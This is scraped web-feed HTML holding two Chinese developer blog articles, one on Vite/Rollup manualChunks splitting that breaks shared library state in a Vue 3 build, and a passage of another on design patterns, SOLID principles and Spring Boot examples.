ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">问题背景</h2>
<p>在使用 Vite + Rollup 构建的 Vue 3 项目中，引入第三方组件库 <code>ai-agent</code> 后，发现开发环境正常运行，但生产环境打包上线后出现兼容性问题。</p>
<h2 data-id="heading-1">问题现象</h2>
<ul>
<li><strong>开发环境</strong>：一切正常，无任何错误</li>
<li><strong>生产环境</strong>：打包后运行时出现兼容性问题，功能异常</li>
<li><strong>临时解决方案</strong>：注释掉 [vite.config.ts] 中 manualChunks 对 <code>@vueuse/core</code> 和 [naive-ui] 的单独分包配置</li>
</ul>
<h2 data-id="heading-2">根本原因分析</h2>
<h3 data-id="heading-3">1. 开发环境 vs 生产环境差异</h3>























<table><thead><tr><th>环境</th><th>模块加载方式</th><th>manualChunks 生效</th><th>依赖解析</th></tr></thead><tbody><tr><td>开发环境</td><td>原生 ES Modules</td><td>❌ 不生效</td><td>动态解析，Node.js 模块机制</td></tr><tr><td>生产环境</td><td>Rollup 打包</td><td>✅ 生效</td><td>静态分析，按配置分包</td></tr></tbody></table>
<h3 data-id="heading-4">2. 依赖状态隔离问题</h3>
<p><strong>核心问题</strong>：具有内部状态的库被分到不同 chunk 后，造成状态不共享。</p>
<p>以 <code>@vueuse/core</code> 为例：</p>
<ul>
<li>包含全局状态（globalState）、缓存、事件监听器等</li>
<li>当被分到不同 chunk 时，每个 chunk 都有独立的状态实例</li>
<li>导致运行时行为不一致，甚至功能失效</li>
</ul>
<h3 data-id="heading-5">3. 版本兼容性风险</h3>
<p>虽然 <code>ai-agent</code> 和主项目可能使用兼容的依赖版本，但 manualChunks 强制分离会：</p>
<ul>
<li>破坏 Rollup 的自动去重机制</li>
<li>即使是同一版本，也被复制到不同 bundle</li>
<li>增加 bundle 体积，降低运行效率</li>
</ul>
<h2 data-id="heading-6">技术细节剖析</h2>
<h3 data-id="heading-7">正常情况（无 manualChunks）</h3>
<pre><code class="hljs language-bash" lang="bash">vendor.js
├── @vueuse/core (单例)
├── naive-ui (单例)  
├── ai-agent
└── 其他依赖
</code></pre>
<p>✅ 所有模块共享同一份依赖实例</p>
<h3 data-id="heading-8">问题情况（有 manualChunks）</h3>
<pre><code class="hljs language-bash" lang="bash">vueuse.js
└── @vueuse/core (实例A)

naive-ui.js  
└── naive-ui (实例A)

vendor.js
├── @vueuse/core (实例B) ← ai-agent 内部使用
├── naive-ui (实例B) ← ai-agent 内部使用
└── ai-agent
</code></pre>
<p>❌ 状态隔离，潜在冲突</p>
<h2 data-id="heading-9">解决方案</h2>
<h3 data-id="heading-10">方案一：保守策略（推荐）</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.ts</span>
<span class="hljs-title function_">manualChunks</span>(<span class="hljs-params">id</span>) {
  <span class="hljs-keyword">if</span> (id.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"node_modules"</span>)) {
    <span class="hljs-comment">// 避免对可能引起状态冲突的库进行单独分包</span>
    <span class="hljs-comment">// 让它们统一打包到 vendor chunk 中</span>
    
    <span class="hljs-keyword">if</span> (id.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"await-to-js"</span>)) {
      <span class="hljs-keyword">return</span> <span class="hljs-string">"awaitToJs"</span>;
    }
    <span class="hljs-keyword">if</span> (id.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"axios"</span>)) {
      <span class="hljs-keyword">return</span> <span class="hljs-string">"axios"</span>;
    }
    <span class="hljs-comment">// ... 其他无状态的工具库</span>
    
    <span class="hljs-comment">// 不单独分包 @vueuse/core、naive-ui 等有状态库</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"vendor"</span>;
  }
}
</code></pre>
<h3 data-id="heading-11">方案二：精确控制策略</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 如果确实需要分包，确保版本完全一致</span>
<span class="hljs-keyword">const</span> sharedDeps = [
  <span class="hljs-string">'@vueuse/core'</span>,
  <span class="hljs-string">'naive-ui'</span>, 
  <span class="hljs-string">'vue'</span>
];

<span class="hljs-title function_">manualChunks</span>(<span class="hljs-params">id</span>) {
  <span class="hljs-keyword">if</span> (id.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"node_modules"</span>)) {
    <span class="hljs-comment">// 检查是否为共享依赖</span>
    <span class="hljs-keyword">const</span> sharedDep = sharedDeps.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">dep</span> =&gt;</span> id.<span class="hljs-title function_">includes</span>(dep));
    <span class="hljs-keyword">if</span> (sharedDep) {
      <span class="hljs-keyword">return</span> <span class="hljs-string">'shared'</span>; <span class="hljs-comment">// 统一放到 shared chunk</span>
    }
    
    <span class="hljs-comment">// 其他依赖正常分包</span>
    <span class="hljs-keyword">if</span> (id.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"lodash-es"</span>)) {
      <span class="hljs-keyword">return</span> <span class="hljs-string">"lodash"</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-string">"vendor"</span>;
  }
}
</code></pre>
<h2 data-id="heading-12">最佳实践建议</h2>
<h3 data-id="heading-13">1. 分包原则</h3>
<ul>
<li><strong>可以分包</strong>：纯函数库（lodash-es、date-fns）、无状态工具库</li>
<li><strong>避免分包</strong>：UI 组件库、状态管理库、包含全局配置的库</li>
</ul>
<h3 data-id="heading-14">2. 依赖管理</h3>
<ul>
<li>保持项目依赖与第三方库依赖的版本兼容性</li>
<li>使用 <code>npm ls &lt;package&gt;</code> 检查依赖树</li>
<li>定期更新依赖，减少版本碎片化</li>
</ul>
<h3 data-id="heading-15">3. 调试技巧</h3>
<ul>
<li>使用 <a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">rollup-plugin-visualizer</a> 分析打包结果</li>
<li>在浏览器中检查模块的内存地址是否一致</li>
<li>对比开发环境和生产环境的网络请求和 bundle 内容</li>
</ul>
<h3 data-id="heading-16">4. 预防措施</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 在 vite.config.ts 中添加注释说明</span>
<span class="hljs-comment">// 注意：由于第三方库可能依赖相同的基础库，</span>
<span class="hljs-comment">// 为避免状态隔离问题，暂不单独分包以下依赖：</span>
<span class="hljs-comment">// - @vueuse/core (包含全局状态)</span>
<span class="hljs-comment">// - naive-ui (UI 组件库，包含主题配置)</span>
</code></pre>
<p>这个问题完美展示了现代前端开发中，看似简单的配置可能带来的复杂运行时问题，也体现了深入理解工具链的重要性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[设计模式的本质：隔离变化]]></title>    <link>https://juejin.cn/post/7605817795629269042</link>    <guid>https://juejin.cn/post/7605817795629269042</guid>    <pubDate>2026-02-13T05:37:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605817795629269042" data-draft-id="7605817795628187698" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="设计模式的本质：隔离变化"/> <meta itemprop="keywords" content="设计模式,后端"/> <meta itemprop="datePublished" content="2026-02-13T05:37:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LukeLi"/> <meta itemprop="url" content="https://juejin.cn/user/430664725579725"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            设计模式的本质：隔离变化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/430664725579725/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LukeLi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T05:37:18.000Z" title="Fri Feb 13 2026 05:37:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"> 设计模式的本质：隔离变化</h2>
<h3 data-id="heading-1">一、为什么要学设计模式？</h3>
<h4 data-id="heading-2">❓ 痛点：没有设计模式的代码有多痛苦？</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 地狱级 if-else（每次加新功能都要改核心）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processOrder</span><span class="hljs-params">(Order order)</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-string">"NORMAL"</span>.equals(order.getType())) {
        <span class="hljs-comment">// 正常订单逻辑（50行）</span>
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">"VIP.equals(order.getType())) {
        // VIP 订单逻辑（60行）
    } else if ("</span>GROUP_BUY<span class="hljs-string">".equals(order.getType())) {
        // 拼团逻辑（70行）
    }
    // 老板说要加“预售”？再加一个 else if...
}
</span></code></pre>
<p>后果：</p>
<ul>
<li>
<p>🔥 改一处，崩三处（测试覆盖难）</p>
</li>
<li>
<p>🧩 无法复用（逻辑散落在各处）</p>
</li>
<li>
<p>👥 新人看不懂（协作成本高）</p>
</li>
</ul>
<h4 data-id="heading-3">✅ 优化后代码（策略模式）</h4>
<h5 data-id="heading-4">第1步：定义一个接口</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderHandler</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(String type)</span>;
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Order order)</span>;
}
</code></pre>
<h5 data-id="heading-5">第2步：每种订单写一个类</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 普通订单</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NormalOrderHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">OrderHandler</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(String type)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"NORMAL"</span>.equals(type);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Order order)</span> {
        System.out.println(<span class="hljs-string">"处理普通订单"</span>);
    }
}

<span class="hljs-comment">// VIP 订单</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VipOrderHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">OrderHandler</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(String type)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"VIP"</span>.equals(type);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Order order)</span> {
        System.out.println(<span class="hljs-string">"处理VIP订单"</span>);
    }
}

<span class="hljs-comment">// 拼团订单</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GroupBuyHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">OrderHandler</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(String type)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"GROUP_BUY"</span>.equals(type);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Order order)</span> {
        System.out.println(<span class="hljs-string">"处理拼团订单"</span>);
    }
}
</code></pre>
<h5 data-id="heading-6">第3步：主方法改成这样</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 把所有处理器放到一个列表里（实际项目中可用 Spring 自动注入）</span>
List&lt;OrderHandler&gt; handlers = Arrays.asList(
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">NormalOrderHandler</span>(),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">VipOrderHandler</span>(),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroupBuyHandler</span>()
);

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processOrder</span><span class="hljs-params">(Order order)</span> {
    <span class="hljs-keyword">for</span> (OrderHandler handler : handlers) {
        <span class="hljs-keyword">if</span> (handler.supports(order.getType())) {
            handler.handle(order);
            <span class="hljs-keyword">return</span>;
        }
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"不支持的订单类型: "</span> + order.getType());
}
</code></pre>
<hr/>
<h4 data-id="heading-7">🎯 对比效果</h4>

























<table><thead><tr><th><strong>场景</strong></th><th><strong>原始代码</strong></th><th><strong>优化后代码</strong></th></tr></thead><tbody><tr><td>加“预售订单”</td><td>要改 <code>processOrder</code> 方法</td><td>只需新增一个 <code>PresaleOrderHandler</code> 类</td></tr><tr><td>代码结构</td><td>所有逻辑挤在一起</td><td>每种类型独立，清晰易读</td></tr><tr><td>测试</td><td>难以单独测某一种</td><td>每个 Handler 可单独测试</td></tr></tbody></table>
<p>💡 本质：把“会变的”封装起来，让“不变的”稳定运行</p>
<h3 data-id="heading-8">二、SOLID 原则：隔离变化的 5 条军规</h3>
<h4 data-id="heading-9">1. 单一职责（SRP）→ 一个类只干一件事</h4>
<ul>
<li>
<p>问题：UserService 既管用户信息，又发邮件、记日志</p>
</li>
<li>
<p>隔离变化：把“发邮件”、“记日志”拆出去</p>
</li>
<li>
<p>效果：改邮件逻辑不影响用户保存</p>
</li>
</ul>
<h4 data-id="heading-10">2. 开闭原则（OCP）→ 对扩展开放，对修改关闭</h4>
<ul>
<li>
<p>问题：加新支付方式要改 OrderService</p>
</li>
<li>
<p>隔离变化：用策略模式，新增类不改旧代码</p>
</li>
<li>
<p>效果：需求变，代码不动</p>
</li>
</ul>
<h4 data-id="heading-11">3. 里氏替换（LSP）→ 子类能无缝替换父类</h4>
<ul>
<li>
<p>问题：Square 继承 Rectangle，面积计算出错</p>
</li>
<li>
<p>隔离变化：正方形和矩形应为兄弟类，而非父子</p>
</li>
<li>
<p>效果：多态安全，不破坏原有逻辑</p>
</li>
</ul>
<h4 data-id="heading-12">4. 接口隔离（ISP）→ 客户端只依赖需要的接口</h4>
<ul>
<li>
<p>问题：Printer 被迫实现 fax() 方法</p>
</li>
<li>
<p>隔离变化：拆成 Printer/Scanner/Fax 小接口</p>
</li>
<li>
<p>效果：类只实现自己需要的功能</p>
</li>
</ul>
<h4 data-id="heading-13">5. 依赖倒置（DIP）→ 依赖抽象，不依赖具体</h4>
<ul>
<li>
<p>问题：OrderService 直接 new MySQLDatabase()</p>
</li>
<li>
<p>隔离变化：依赖 Database 接口，注入具体实现</p>
</li>
<li>
<p>效果：换 PostgreSQL？只需改配置！</p>
</li>
</ul>
<h3 data-id="heading-14">三、23 种设计模式：如何隔离变化？</h3>
<p>每个模式都回答一个问题：什么在变？怎么隔离？</p>
<h4 data-id="heading-15">🧱 创建型模式（5种）：隔离“对象创建”的变化</h4>









































<table><thead><tr><th><strong>模式</strong></th><th><strong>什么在变？</strong></th><th><strong>怎么隔离？</strong></th><th><strong>Spring Boot 实战</strong></th></tr></thead><tbody><tr><td>单例</td><td>全局唯一实例</td><td>私有构造 + 静态方法</td><td><code>@Component</code> + <code>@Scope("singleton")</code></td></tr><tr><td>工厂方法</td><td>创建哪种对象</td><td>子类决定</td><td><code>@Bean</code> 方法返回不同实现</td></tr><tr><td>抽象工厂</td><td>创建产品族</td><td>工厂接口</td><td>多数据源配置（MySQLFactory / PGFactory）</td></tr><tr><td>建造者</td><td>复杂对象构建步骤</td><td>分步构建</td><td><code>RestTemplateBuilder</code>, <code>WebClient.builder()</code></td></tr><tr><td>原型</td><td>对象初始化成本高</td><td>克隆现有对象</td><td><code>@Scope("prototype")</code> Bean</td></tr></tbody></table>
<p>✅ 核心：不让业务代码关心“对象怎么来”</p>
<h4 data-id="heading-16">🔗 结构型模式（7种）：隔离“结构组合”的变化</h4>





















































<table><thead><tr><th><strong>模式</strong></th><th><strong>什么在变？</strong></th><th><strong>怎么隔离？</strong></th><th><strong>Spring Boot 实战</strong></th></tr></thead><tbody><tr><td>适配器</td><td>接口不兼容</td><td>包装旧接口</td><td>集成第三方 SDK（如微信支付适配器）</td></tr><tr><td>装饰器</td><td>功能动态增减</td><td>包装增强</td><td><code>BufferedInputStream</code>, Spring Security 过滤器链</td></tr><tr><td>代理</td><td>控制对象访问</td><td>中介拦截</td><td>Spring AOP（事务、日志）、Feign Client</td></tr><tr><td>外观</td><td>子系统复杂</td><td>提供统一入口</td><td><code>@Service</code> 封装多个 Repository 调用</td></tr><tr><td>桥接</td><td>抽象与实现耦合</td><td>分离维度</td><td>日志框架（Logger + Appender）</td></tr><tr><td>组合</td><td>树形结构</td><td>统一处理</td><td>菜单权限树、组织架构树</td></tr><tr><td>享元</td><td>大量相似对象</td><td>共享内部状态</td><td>数据库连接池、线程池</td></tr></tbody></table>
<p>✅ 核心：不让调用方知道“内部怎么组合”</p>
<h4 data-id="heading-17">🔄 行为型模式（11种）：隔离“行为算法”的变化</h4>













































































<table><thead><tr><th><strong>模式</strong></th><th><strong>什么在变？</strong></th><th><strong>怎么隔离？</strong></th><th><strong>Spring Boot 实战</strong></th></tr></thead><tbody><tr><td>策略</td><td>算法选择</td><td>封装算法</td><td>支付方式、折扣计算、路由规则</td></tr><tr><td>观察者</td><td>事件通知</td><td>松耦合监听</td><td><code>ApplicationEventPublisher</code>, Spring 事件机制</td></tr><tr><td>责任链</td><td>请求处理链</td><td>传递处理</td><td>Spring Security Filter Chain、审批流</td></tr><tr><td>命令</td><td>请求封装</td><td>对象化请求</td><td>任务队列、撤销操作（如 Redis Queue）</td></tr><tr><td>状态</td><td>状态行为</td><td>状态驱动</td><td>订单状态机（待支付 → 已支付 → 已发货）</td></tr><tr><td>模板方法</td><td>算法骨架</td><td>固定流程</td><td><code>JdbcTemplate</code>, <code>RestTemplate</code></td></tr><tr><td>迭代器</td><td>遍历方式</td><td>统一访问</td><td><code>List.iterator()</code>, Stream API</td></tr><tr><td>中介者</td><td>对象交互</td><td>中心协调</td><td>消息总线、事件中心</td></tr><tr><td>备忘录</td><td>状态保存</td><td>快照恢复</td><td>游戏存档、表单草稿</td></tr><tr><td>访问者</td><td>新操作</td><td>外部定义</td><td>报表生成、AST 遍历</td></tr><tr><td>解释器</td><td>语法规则</td><td>解析执行</td><td>规则引擎（如 Drools）、简单表达式</td></tr></tbody></table>
<p>✅ 核心：不让主流程知道“具体怎么执行”</p>
<h3 data-id="heading-18">四、Spring Boot 中的最佳实践</h3>
<h4 data-id="heading-19">a、创建型模式（5种）</h4>
<h5 data-id="heading-20">1. 单例模式（Singleton）</h5>
<blockquote>
<p>隔离变化：全局唯一实例（如配置、工具类）<br/>
Spring 实现：默认所有 Bean 都是单例</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisCacheService</span> {
    <span class="hljs-comment">// 整个应用只有一个实例</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">get</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">return</span> redisTemplate.opsForValue().get(key);
    }
}
</code></pre>
<p>✅ 效果：无需手动管理实例，Spring 自动保证单例。</p>
<h5 data-id="heading-21">2. 工厂方法模式（Factory Method）</h5>
